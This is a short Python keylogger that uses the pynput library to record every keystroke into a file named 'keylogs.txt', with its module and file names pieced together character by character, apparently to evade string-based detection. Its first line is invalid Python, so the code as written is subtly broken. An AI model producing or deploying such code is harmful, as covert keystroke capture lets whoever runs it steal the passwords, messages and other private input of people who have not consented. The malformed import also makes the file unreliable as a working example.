import __import__('p'+'y'+'n'+'p'+'u'+'t') as pynput
from pynput import keyboard
def on_press(key):
    try:
        with open(''.join(['k', 'e', 'y', 'l', 'o', 'g', 's', '.', 't', 'x', 't']), 'a') as f:
            if key.char.isalnum():
                f.write(key.char)
                print(f'Key pressed: {key.char}')
            else:
                f.write(f'[{key.char}]')
                print(f'Special key pressed: [{key.char}]')
    except AttributeError:
        with open(''.join(['k', 'e', 'y', 'l', 'o', 'g', 's', '.', 't', 'x', 't']), 'a') as f:
            if key == keyboard.Key.space:
                f.write(' ')
                print('Key pressed: [space]')
            elif key == keyboard.Key.enter:
                f.write('\n')
                print('Key pressed: [enter]')
            else:
                f.write(f'[{key.name}]')
                print(f'Special key pressed: [{key.name}]')
def on_release(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()